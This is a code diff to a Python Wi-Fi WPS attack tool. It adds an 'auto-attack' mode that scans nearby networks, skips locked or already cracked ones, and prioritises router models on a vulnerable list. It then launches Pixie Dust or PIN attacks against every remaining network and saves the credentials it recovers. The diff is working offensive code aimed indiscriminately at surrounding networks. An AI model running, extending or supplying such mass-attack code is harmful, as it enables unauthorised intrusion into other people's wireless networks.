@@ -848,6 +848,51 @@ class Companion:
         except (ImportError, AttributeError, TypeError):
             pass
 
+    def auto_attack(self):
+        """
+        Scan for networks, prioritize them, and run the best attack against each of them
+        """
+        try:
+            with open(args.vuln_list, 'r', encoding='utf-8') as file:
+                vuln_list = file.read().splitlines()
+        except FileNotFoundError:
+            vuln_list = []
+        scanner = WiFiScanner(self.interface, vuln_list)
+        networks = scanner.iw_scanner()
+        if not networks:
+            print('[-] No WPS networks found.')
+            return
+
+        green_nets = []
+        white_nets = []
+        for n, network in networks.items():
+            model = '{} {}'.format(network['Model'], network['Model number']).strip()
+            # Skip already cracked networks (yellow)
+            if (network['BSSID'], network.get('ESSID', 'HIDDEN')) in scanner.stored:
+                continue
+            # Skip locked networks (red) as they cannot be attacked with PIN-based methods
+            if network['WPS locked']:
+                continue
+            # Prioritize vulnerable networks (green)
+            if vuln_list and (model in vuln_list):
+                green_nets.append(network)
+            else:
+                white_nets.append(network)
+
+        if not (green_nets or white_nets):
+            print('[i] No vulnerable networks found.')
+            return
+
+        print(f"Attacking {len(green_nets)} green networks…")
+        for network in green_nets:
+            print(f"[*] Attacking {network['ESSID']} ({network['BSSID']})…")
+            self.single_connection(network['BSSID'], pixiemode=True)
+
+        print(f"Attacking {len(white_nets)} white networks…")
+        for network in white_nets:
+            print(f"[*] Attacking {network['ESSID']} ({network['BSSID']})…")
+            self.single_connection(network['BSSID'])
+
 
 class WiFiScanner:
     """docstring for WiFiScanner"""
@@ -1266,6 +1311,11 @@ if __name__ == '__main__':
         action='store_true',
         help='Verbose output'
         )
+    parser.add_argument(
+        '--auto-attack',
+        action='store_true',
+        help='Run in attacker mode'
+    )
 
     args = parser.parse_args()
 
@@ -1285,10 +1335,14 @@ if __name__ == '__main__':
     if not ifaceUp(args.interface):
         die('Unable to up interface "{}"'.format(args.interface))
 
+    if args.auto_attack:
+        args.write = True
     while True:
         try:
             companion = Companion(args.interface, args.write, print_debug=args.verbose)
-            if args.pbc:
+            if args.auto_attack:
+                companion.auto_attack()
+            elif args.pbc:
                 companion.single_connection(pbc_mode=True)
             else:
                 if not args.bssid:
